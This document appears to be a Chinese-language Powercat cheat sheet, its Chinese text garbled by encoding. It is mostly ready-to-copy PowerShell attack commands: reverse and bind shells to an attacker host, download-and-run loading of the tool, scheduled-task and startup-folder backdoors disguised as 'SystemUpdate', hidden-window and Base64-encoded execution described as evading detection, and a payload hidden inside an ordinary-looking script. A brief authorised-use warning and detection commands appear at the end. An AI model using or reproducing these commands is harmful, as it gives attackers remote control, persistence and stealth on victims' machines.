# Powercat å¿«é€Ÿå‚è€ƒæ‰‹å†Œ

## å¿«é€Ÿå¯¼èˆª
- [åŸºç¡€å‘½ä»¤](#åŸºç¡€å‘½ä»¤)
- [å¸¸ç”¨åœºæ™¯](#å¸¸ç”¨åœºæ™¯)
- [å‚æ•°é€ŸæŸ¥è¡¨](#å‚æ•°é€ŸæŸ¥è¡¨)
- [æ•…éšœæ’é™¤](#æ•…éšœæ’é™¤)
- [ä¸€é”®å¤åˆ¶å‘½ä»¤](#ä¸€é”®å¤åˆ¶å‘½ä»¤)

---

## åŸºç¡€å‘½ä»¤

### å¯¼å…¥æ¨¡å—
```powershell
# æ–¹æ³• 1: ç›´æ¥ç‚¹è¿è¡Œ
. .\powercat.ps1

# æ–¹æ³• 2: Import-Module
Import-Module .\powercat.ps1

# æ–¹æ³• 3: è¿œç¨‹åŠ è½½ï¼ˆéœ€è¦ç½‘ç»œï¼‰
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```

### è·å–å¸®åŠ©
```powershell
powercat -h
Get-Help powercat
```

---

## å¸¸ç”¨åœºæ™¯

### ğŸ”¹ åœºæ™¯ 1: åå¼¹ Shell (æœ€å¸¸ç”¨)

**æ”»å‡»æœºç›‘å¬** (ç›‘å¬ 4444 ç«¯å£ç­‰å¾…è¿æ¥)
```powershell
powercat -l -p 4444
```

**ç›®æ ‡æœºè¿æ¥å¹¶å‘é€ Shell**
```powershell
# Windows CMD Shell
powercat -c 10.1.1.1 -p 4444 -e cmd

# PowerShell Shell
powercat -c 10.1.1.1 -p 4444 -ep
```

---

### ğŸ”¹ åœºæ™¯ 2: æ­£å‘ Shell (ç›®æ ‡æœºç›‘å¬)

**ç›®æ ‡æœºç›‘å¬** (åœ¨ç›®æ ‡æœºä¸Šå¼€å¯ç›‘å¬)
```powershell
powercat -l -p 5555 -e cmd
```

**æ”»å‡»æœºè¿æ¥**
```powershell
powercat -c target-ip -p 5555
```

---

### ğŸ”¹ åœºæ™¯ 3: æ–‡ä»¶ä¼ è¾“

**å‘é€æ–‡ä»¶**
```powershell
# æ¥æ”¶æ–¹ç›‘å¬
powercat -l -p 8000 -of C:\received_file.txt

# å‘é€æ–¹å‘é€æ–‡ä»¶
powercat -c receiver-ip -p 8000 -i C:\file_to_send.txt
```

**ç›®å½•æ‰“åŒ…å‘é€**
```powershell
# å‘é€æ–¹ï¼šå‹ç¼©å¹¶å‘é€
Compress-Archive -Path C:\folder -DestinationPath C:\temp.zip
powercat -c receiver-ip -p 8000 -i C:\temp.zip

# æ¥æ”¶æ–¹ï¼šæ¥æ”¶å¹¶è§£å‹
powercat -l -p 8000 -of C:\received.zip
Expand-Archive -Path C:\received.zip -DestinationPath C:\extracted
```

---

### ğŸ”¹ åœºæ™¯ 4: ç«¯å£æ‰«æ

**å•ç«¯å£æ£€æµ‹**
```powershell
powercat -c target-ip -p 80 -d
# å¦‚æœç«¯å£å¼€æ”¾ä¼šæ˜¾ç¤º "Connection succeeded"
```

**æ‰¹é‡æ‰«æ**
```powershell
# æ‰«æå¸¸è§ç«¯å£
21,22,23,25,80,443,445,3389 | ForEach-Object {
    Write-Host "Scanning port $_..."
    powercat -c target-ip -p $_ -d -t 2 2>&1
}
```

**æ‰«æç«¯å£èŒƒå›´**
```powershell
1..1024 | ForEach-Object {
    $result = powercat -c 10.1.1.1 -p $_ -d -t 1 2>&1
    if($result -like "*succeeded*") {
        Write-Host "Port $_ is OPEN" -ForegroundColor Green
    }
}
```

---

### ğŸ”¹ åœºæ™¯ 5: ç«¯å£è½¬å‘ / æµé‡ä¸­ç»§

**TCP è½¬å‘**
```powershell
# ç›‘å¬æœ¬åœ° 8000ï¼Œè½¬å‘åˆ° 192.168.1.100:9000
powercat -l -p 8000 -r tcp:192.168.1.100:9000
```

**UDP è½¬å‘**
```powershell
powercat -l -p 8000 -r udp:192.168.1.100:9000
```

**è·¨åè®®è½¬å‘ (TCP â†’ UDP)**
```powershell
# ç›‘å¬ TCP 8000ï¼Œè½¬å‘åˆ° UDP 9000
powercat -l -p 8000 -r udp:target-ip:9000
```

**å†…ç½‘ç©¿é€ç¤ºä¾‹**
```powershell
# åœºæ™¯ï¼šè®¿é—®å†…ç½‘ RDP (3389)
# ä¸­è½¬æœºæ‰§è¡Œï¼š
powercat -l -p 13389 -r tcp:internal-server:3389

# æ”»å‡»æœºè¿æ¥ï¼š
mstsc /v:relay-server:13389
```

---

### ğŸ”¹ åœºæ™¯ 6: DNS éšè”½é€šé“

**å¯åŠ¨ dnscat2 æœåŠ¡ç«¯** (Linux)
```bash
# éœ€è¦å…ˆå®‰è£… dnscat2
ruby dnscat2.rb secret.example.com
```

**å®¢æˆ·ç«¯è¿æ¥**
```powershell
# é€šè¿‡ DNS éšè”½é€šé“è¿æ¥
powercat -c dns-server-ip -p 53 -dns secret.example.com
```

---

### ğŸ”¹ åœºæ™¯ 7: æŒä¹…åŒ–åé—¨

**è‡ªåŠ¨é‡å¯ç›‘å¬**
```powershell
# è¿æ¥æ–­å¼€åè‡ªåŠ¨é‡å¯
powercat -l -p 4444 -e cmd -rep
```

**è®¡åˆ’ä»»åŠ¡æŒä¹…åŒ–**
```powershell
# åˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼Œæ¯å°æ—¶æ‰§è¡Œ
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"IEX (Get-Content C:\powercat.ps1); powercat -c attacker-ip -p 4444 -e cmd -rep`""
$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1)
Register-ScheduledTask -TaskName "SystemUpdate" -Action $Action -Trigger $Trigger
```

**å¼€æœºè‡ªå¯åŠ¨**
```powershell
# æ·»åŠ åˆ°å¯åŠ¨é¡¹
$StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$Command = "powershell.exe -WindowStyle Hidden -Command `"IEX (Get-Content C:\powercat.ps1); powercat -c attacker-ip -p 4444 -e cmd`""
Set-Content -Path "$StartupPath\update.bat" -Value $Command
```

---

### ğŸ”¹ åœºæ™¯ 8: Payload ç”Ÿæˆ

**ç”Ÿæˆ PowerShell è„šæœ¬**
```powershell
# ç”Ÿæˆåå¼¹ shell payload
powercat -c attacker-ip -p 4444 -e cmd -g > payload.ps1

# æ‰§è¡Œ payload
powershell.exe -ExecutionPolicy Bypass -File payload.ps1
```

**ç”Ÿæˆ Base64 ç¼–ç  Payload**
```powershell
# ç”Ÿæˆç¼–ç  payload
$encoded = powercat -c attacker-ip -p 4444 -e cmd -ge

# æ‰§è¡Œç¼–ç  payloadï¼ˆé€‚åˆå•è¡Œå‘½ä»¤ï¼‰
powershell.exe -EncodedCommand $encoded
```

**åµŒå…¥åˆ°å…¶ä»–è„šæœ¬**
```powershell
# ç”Ÿæˆ payload
$payload = powercat -c attacker-ip -p 4444 -ep -g

# åµŒå…¥åˆ°è„šæœ¬ä¸­
@"
# Some legitimate code here
Write-Host "Updating system..."

# Hidden payload
$payload

# More legitimate code
"@ | Out-File malicious.ps1
```

---

### ğŸ”¹ åœºæ™¯ 9: UDP é€šä¿¡

**UDP ç›‘å¬**
```powershell
powercat -l -p 8000 -u
```

**UDP å‘é€**
```powershell
# å‘é€æ•°æ®ï¼ˆè®°å¾—å…ˆå‘é€ï¼ŒæœåŠ¡ç«¯æ‰èƒ½å“åº”ï¼‰
"Hello UDP" | powercat -c target-ip -p 8000 -u
```

**UDP æ–‡ä»¶ä¼ è¾“**
```powershell
# æ¥æ”¶æ–¹
powercat -l -p 8000 -u -of C:\received.txt

# å‘é€æ–¹
powercat -c receiver-ip -p 8000 -u -i C:\file.txt
```

---

### ğŸ”¹ åœºæ™¯ 10: æ•°æ®ç®¡é“

**æ¥æ”¶å¹¶æ‰§è¡Œ**
```powershell
# ç›‘å¬å¹¶æ‰§è¡Œæ¥æ”¶çš„ PowerShell å‘½ä»¤
powercat -l -p 4444 | IEX
```

**å‘é€å‘½ä»¤**
```powershell
"Get-Process" | powercat -c target-ip -p 4444
```

**é“¾å¼ä¼ è¾“**
```powershell
# æœºå™¨A â†’ æœºå™¨B â†’ æœºå™¨C
# æœºå™¨B:
powercat -l -p 8000 | powercat -c machine-c -p 9000
```

---

## å‚æ•°é€ŸæŸ¥è¡¨

### æ ¸å¿ƒå‚æ•°

| å‚æ•° | ç®€å†™ | å€¼ç±»å‹ | è¯´æ˜ | ç¤ºä¾‹ |
|------|------|--------|------|------|
| `-Client` | `-c` | IPåœ°å€ | å®¢æˆ·ç«¯æ¨¡å¼ï¼Œè¿æ¥åˆ°ç›®æ ‡ | `-c 10.1.1.1` |
| `-Listen` | `-l` | å¼€å…³ | ç›‘å¬æ¨¡å¼ | `-l` |
| `-Port` | `-p` | ç«¯å£å· | ç«¯å£ | `-p 4444` |
| `-Execute` | `-e` | ç¨‹åºå | æ‰§è¡Œç¨‹åº | `-e cmd` |
| `-ExecutePowershell` | `-ep` | å¼€å…³ | PowerShellä¼šè¯ | `-ep` |

### åè®®å‚æ•°

| å‚æ•° | ç®€å†™ | å€¼ç±»å‹ | è¯´æ˜ | ç¤ºä¾‹ |
|------|------|--------|------|------|
| `-UDP` | `-u` | å¼€å…³ | UDPæ¨¡å¼ | `-u` |
| `-dnscat2` | `-dns` | åŸŸå | DNSéšè”½é€šé“ | `-dns secret.com` |
| `-DNSFailureThreshold` | `-dnsft` | æ•°å­— | DNSå¤±è´¥é˜ˆå€¼ | `-dnsft 10` |

### æ•°æ®å‚æ•°

| å‚æ•° | ç®€å†™ | å€¼ç±»å‹ | è¯´æ˜ | ç¤ºä¾‹ |
|------|------|--------|------|------|
| `-Input` | `-i` | è·¯å¾„/æ•°æ® | è¾“å…¥æ•°æ® | `-i C:\file.txt` |
| `-OutputType` | `-o` | Host/String/Bytes | è¾“å‡ºç±»å‹ | `-o String` |
| `-OutputFile` | `-of` | è·¯å¾„ | è¾“å‡ºåˆ°æ–‡ä»¶ | `-of C:\out.txt` |

### æ§åˆ¶å‚æ•°

| å‚æ•° | ç®€å†™ | å€¼ç±»å‹ | è¯´æ˜ | ç¤ºä¾‹ |
|------|------|--------|------|------|
| `-Relay` | `-r` | æ ¼å¼åŒ–å­—ç¬¦ä¸² | æµé‡ä¸­ç»§ | `-r tcp:10.1.1.1:9000` |
| `-Timeout` | `-t` | ç§’æ•° | è¶…æ—¶æ—¶é—´ | `-t 30` |
| `-Disconnect` | `-d` | å¼€å…³ | å‘é€åæ–­å¼€ | `-d` |
| `-Repeater` | `-rep` | å¼€å…³ | é‡å¤æ¨¡å¼ | `-rep` |

### ç”Ÿæˆå‚æ•°

| å‚æ•° | ç®€å†™ | å€¼ç±»å‹ | è¯´æ˜ | ç¤ºä¾‹ |
|------|------|--------|------|------|
| `-GeneratePayload` | `-g` | å¼€å…³ | ç”Ÿæˆpayload | `-g` |
| `-GenerateEncoded` | `-ge` | å¼€å…³ | ç”Ÿæˆç¼–ç payload | `-ge` |

---

## æ•…éšœæ’é™¤

### âŒ é—®é¢˜: "You must select either client mode (-c) or listen mode (-l)"
**åŸå› **: æ²¡æœ‰æŒ‡å®š `-c` æˆ– `-l`  
**è§£å†³**: å¿…é¡»é€‰æ‹©å®¢æˆ·ç«¯æˆ–ç›‘å¬æ¨¡å¼ä¹‹ä¸€
```powershell
# é”™è¯¯
powercat -p 4444

# æ­£ç¡®
powercat -l -p 4444
```

---

### âŒ é—®é¢˜: "Please provide a port number to -p"
**åŸå› **: æ²¡æœ‰æŒ‡å®šç«¯å£  
**è§£å†³**: æ·»åŠ  `-p` å‚æ•°
```powershell
# é”™è¯¯
powercat -l

# æ­£ç¡®
powercat -l -p 4444
```

---

### âŒ é—®é¢˜: "The selected port XXXX is already in use"
**åŸå› **: ç«¯å£è¢«å ç”¨  
**è§£å†³**: æ›´æ¢ç«¯å£æˆ–å…³é—­å ç”¨è¿›ç¨‹
```powershell
# æŸ¥çœ‹ç«¯å£å ç”¨
netstat -ano | findstr :4444

# æ€æ­»è¿›ç¨‹
taskkill /PID <PID> /F

# æˆ–ä½¿ç”¨å…¶ä»–ç«¯å£
powercat -l -p 5555
```

---

### âŒ é—®é¢˜: UDP æ¨¡å¼ä¸‹æœåŠ¡å™¨æ— å“åº”
**åŸå› **: UDP éœ€è¦å®¢æˆ·ç«¯å…ˆå‘é€æ•°æ®  
**è§£å†³**: å®¢æˆ·ç«¯å…ˆå‘é€ä»»æ„æ•°æ®
```powershell
# åœ¨ UDP å®¢æˆ·ç«¯æ¨¡å¼ä¸‹ï¼Œå…ˆå‘é€æ•°æ®
"HELLO" | powercat -c server-ip -p 8000 -u
```

---

### âŒ é—®é¢˜: PowerShell ä¼šè¯å¡ä½
**åŸå› **: åœ¨ `-ep` æ¨¡å¼ä¸‹è¿›å…¥äº†å…¶ä»–shell  
**è§£å†³**: ä¸è¦æ‰§è¡Œ `cmd`, `nslookup` ç­‰å‘½ä»¤
```powershell
# é¿å…æ‰§è¡Œè¿™äº›å‘½ä»¤
cmd
nslookup
netsh

# ä½¿ç”¨ PowerShell åŸç”Ÿå‘½ä»¤
Get-Process
Get-Service
```

---

### âŒ é—®é¢˜: Timeout è¶…æ—¶
**åŸå› **: ç›®æ ‡ä¸å¯è¾¾æˆ–ç«¯å£æœªå¼€æ”¾  
**è§£å†³**: æ£€æŸ¥ç½‘ç»œè¿æ¥ï¼Œå¢åŠ è¶…æ—¶æ—¶é—´
```powershell
# å¢åŠ è¶…æ—¶åˆ° 120 ç§’
powercat -c target-ip -p 4444 -t 120
```

---

### âŒ é—®é¢˜: DNS æ¨¡å¼é¢‘ç¹å¤±è´¥
**åŸå› **: ç½‘ç»œä¸ç¨³å®šæˆ– DNS æœåŠ¡å™¨é—®é¢˜  
**è§£å†³**: è°ƒæ•´å¤±è´¥é˜ˆå€¼
```powershell
# å¢åŠ å¤±è´¥é˜ˆå€¼
powercat -c dns-server -p 53 -dns domain.com -dnsft 50

# æ¥æ”¶æ–‡ä»¶æ—¶è®¾ä¸º 0
powercat -c dns-server -p 53 -dns domain.com -dnsft 0
```

---

## ä¸€é”®å¤åˆ¶å‘½ä»¤

### åŸºç¡€åå¼¹ Shell
```powershell
# ç›‘å¬ç«¯ (æ”»å‡»æœº)
powercat -l -p 4444 -v

# è¿æ¥ç«¯ (ç›®æ ‡æœº) - CMD
powercat -c <ATTACKER_IP> -p 4444 -e cmd -v

# è¿æ¥ç«¯ (ç›®æ ‡æœº) - PowerShell
powercat -c <ATTACKER_IP> -p 4444 -ep -v
```

### æŒä¹…åŒ–åé—¨
```powershell
# é‡å¤æ¨¡å¼åé—¨
powercat -l -p 4444 -e cmd -rep -v

# æˆ–
powercat -c <ATTACKER_IP> -p 4444 -e cmd -rep -v
```

### æ–‡ä»¶ä¼ è¾“
```powershell
# æ¥æ”¶æ–‡ä»¶
powercat -l -p 8000 -of C:\received_file.zip -v

# å‘é€æ–‡ä»¶
powercat -c <RECEIVER_IP> -p 8000 -i C:\file_to_send.zip -v
```

### ç«¯å£è½¬å‘
```powershell
# TCP è½¬å‘
powercat -l -p 8000 -r tcp:<TARGET_IP>:9000 -v

# UDP è½¬å‘
powercat -l -p 8000 -r udp:<TARGET_IP>:9000 -v
```

### Payload ç”Ÿæˆ
```powershell
# ç”Ÿæˆè„šæœ¬
powercat -c <ATTACKER_IP> -p 4444 -e cmd -g > payload.ps1

# ç”Ÿæˆç¼–ç  (ä¸€è¡Œæ‰§è¡Œ)
powercat -c <ATTACKER_IP> -p 4444 -e cmd -ge
```

---

## å¸¸ç”¨ç»„åˆæŠ€å·§

### ğŸ¯ æŠ€å·§ 1: éšè—çª—å£æ‰§è¡Œ
```powershell
Start-Process powershell -WindowStyle Hidden -ArgumentList "-Command `"IEX (Get-Content powercat.ps1); powercat -c attacker-ip -p 4444 -e cmd`""
```

### ğŸ¯ æŠ€å·§ 2: è¿œç¨‹åŠ è½½ + åå¼¹ Shell
```powershell
powershell -Command "IEX (New-Object System.Net.Webclient).DownloadString('http://attacker/powercat.ps1'); powercat -c attacker-ip -p 4444 -e cmd"
```

### ğŸ¯ æŠ€å·§ 3: Base64 ç¼–ç æ‰§è¡Œï¼ˆç»•è¿‡æ£€æµ‹ï¼‰
```powershell
# ç”Ÿæˆç¼–ç å‘½ä»¤
$payload = powercat -c attacker-ip -p 4444 -e cmd -ge

# æ‰§è¡Œ
powershell -EncodedCommand $payload
```

### ğŸ¯ æŠ€å·§ 4: å¾ªç¯é‡è¿ï¼ˆç¡®ä¿è¿æ¥æˆåŠŸï¼‰
```powershell
while($true) {
    try {
        powercat -c attacker-ip -p 4444 -e cmd
    } catch {}
    Start-Sleep -Seconds 60
}
```

### ğŸ¯ æŠ€å·§ 5: ç«¯å£æ•²é—¨
```powershell
# å°è¯•å¤šä¸ªç«¯å£
$ports = @(4444, 5555, 6666, 7777)
foreach($port in $ports) {
    try {
        powercat -c attacker-ip -p $port -e cmd -t 5
        break
    } catch {
        continue
    }
}
```

---

## å®‰å…¨æç¤º

### âš ï¸ ä½¿ç”¨å‰å¿…è¯»
1. **ä»…åœ¨æˆæƒç¯å¢ƒä½¿ç”¨** - æœªæˆæƒè®¿é—®æ˜¯è¿æ³•çš„
2. **æµ‹è¯•ç¯å¢ƒéš”ç¦»** - ä½¿ç”¨è™šæ‹Ÿæœºæˆ–éš”ç¦»ç½‘ç»œ
3. **è®°å½•æ‰€æœ‰æ“ä½œ** - ä¿ç•™æµ‹è¯•è®°å½•
4. **åŠæ—¶æ¸…ç†** - æµ‹è¯•ååˆ é™¤åé—¨å’Œpayload

### ğŸ›¡ï¸ é˜²å¾¡å»ºè®®
```powershell
# æ£€æµ‹ powercat è¿›ç¨‹
Get-Process | Where-Object {$_.CommandLine -like "*powercat*"}

# æ£€æµ‹å¼‚å¸¸ç½‘ç»œè¿æ¥
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"}

# ç›‘æ§ PowerShell æ‰§è¡Œ
Get-WinEvent -LogName "Windows PowerShell" | Where-Object {$_.Message -like "*powercat*"}
```

---

## å¤‡å¿˜å•å›¾ç¤º

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                   Powercat æ¨¡å¼é€‰æ‹©                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                         â”‚
â”‚  å®¢æˆ·ç«¯æ¨¡å¼ (-c)          ç›‘å¬æ¨¡å¼ (-l)                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”             â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                  â”‚
â”‚  â”‚  ä¸»åŠ¨è¿æ¥ â”‚             â”‚  è¢«åŠ¨ç­‰å¾… â”‚                  â”‚
â”‚  â”‚  Target  â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚ Listener â”‚                  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜             â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                  â”‚
â”‚                                                         â”‚
â”‚  é€‚ç”¨åœºæ™¯:                é€‚ç”¨åœºæ™¯:                      â”‚
â”‚  â€¢ åå¼¹ Shell             â€¢ æ­£å‘ Shell                   â”‚
â”‚  â€¢ ä¸»åŠ¨å‘é€æ–‡ä»¶            â€¢ æ¥æ”¶æ–‡ä»¶                     â”‚
â”‚  â€¢ ç«¯å£æ‰«æ               â€¢ æŒä¹…åŒ–åé—¨                    â”‚
â”‚                                                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                   åè®®é€‰æ‹©                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                         â”‚
â”‚  TCP (é»˜è®¤)     UDP (-u)      DNS (-dns)                â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”                â”‚
â”‚  â”‚ å¯é çš„  â”‚    â”‚ å¿«é€Ÿçš„  â”‚    â”‚ éšè”½çš„  â”‚                â”‚
â”‚  â”‚ æœ‰è¿æ¥  â”‚    â”‚ æ— è¿æ¥  â”‚    â”‚ æ…¢é€Ÿçš„  â”‚                â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜                â”‚
â”‚                                                         â”‚
â”‚  å¤§å¤šæ•°åœºæ™¯     æµåª’ä½“/æ¸¸æˆ    é«˜åº¦éšè”½                   â”‚
â”‚                                                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## å¿«é€Ÿå‘½ä»¤ç”Ÿæˆå™¨

å¤åˆ¶ä¸‹é¢çš„å‡½æ•°åˆ° PowerShellï¼Œå¯ä»¥å¿«é€Ÿç”Ÿæˆå‘½ä»¤ï¼š

```powershell
function New-PowercatCommand {
    param(
        [Parameter(Mandatory=$true)]
        [ValidateSet("Listener", "Client", "FileReceive", "FileSend")]
        [string]$Mode,
        
        [string]$IP,
        [int]$Port = 4444,
        [switch]$Shell
    )
    
    switch($Mode) {
        "Listener" {
            $cmd = "powercat -l -p $Port"
            if($Shell) { $cmd += " -e cmd" }
        }
        "Client" {
            $cmd = "powercat -c $IP -p $Port"
            if($Shell) { $cmd += " -e cmd" }
        }
        "FileReceive" {
            $cmd = "powercat -l -p $Port -of C:\received_file"
        }
        "FileSend" {
            $cmd = "powercat -c $IP -p $Port -i C:\file_to_send"
        }
    }
    
    Write-Host "`nç”Ÿæˆçš„å‘½ä»¤:" -ForegroundColor Green
    Write-Host $cmd -ForegroundColor Yellow
    Write-Host "`nå·²å¤åˆ¶åˆ°å‰ªè´´æ¿!" -ForegroundColor Green
    $cmd | Set-Clipboard
    return $cmd
}

# ä½¿ç”¨ç¤ºä¾‹:
# New-PowercatCommand -Mode Listener -Port 4444 -Shell
# New-PowercatCommand -Mode Client -IP "10.1.1.1" -Port 4444 -Shell
```

---

## æ€»ç»“

### æœ€å¸¸ç”¨çš„ 5 ä¸ªå‘½ä»¤

1. **åå¼¹ Shell (ç›‘å¬)**
   ```powershell
   powercat -l -p 4444
   ```

2. **åå¼¹ Shell (è¿æ¥)**
   ```powershell
   powercat -c attacker-ip -p 4444 -e cmd
   ```

3. **æ–‡ä»¶æ¥æ”¶**
   ```powershell
   powercat -l -p 8000 -of C:\file.txt
   ```

4. **æ–‡ä»¶å‘é€**
   ```powershell
   powercat -c target-ip -p 8000 -i C:\file.txt
   ```

5. **ç«¯å£è½¬å‘**
   ```powershell
   powercat -l -p 8000 -r tcp:target:9000
   ```

### è®°ä½è¿™ä¸ªå£è¯€

```
-l æ˜¯ç›‘å¬ï¼Œ-c æ˜¯è¿æ¥
-p æŒ‡ç«¯å£ï¼Œå¿…é¡»è¦æŒ‡å®š
-e è·‘ç¨‹åºï¼Œ-ep æ˜¯ PowerShell
-i é€æ–‡ä»¶ï¼Œ-of æ¥æ¥æ”¶
-r åšä¸­ç»§ï¼Œ-d å¿«é€Ÿæ–­
-g ç”Ÿæˆç ï¼Œ-ge å¸¦ç¼–ç 
```

---

**æç¤º**: å°†æ­¤æ–‡æ¡£ä¿å­˜ä¸ºä¹¦ç­¾ï¼Œä½¿ç”¨æ—¶å¿«é€ŸæŸ¥æ‰¾ï¼

**æ›´æ–°æ—¥æœŸ**: 2025-01-01  
**æ–‡æ¡£ç‰ˆæœ¬**: 1.0
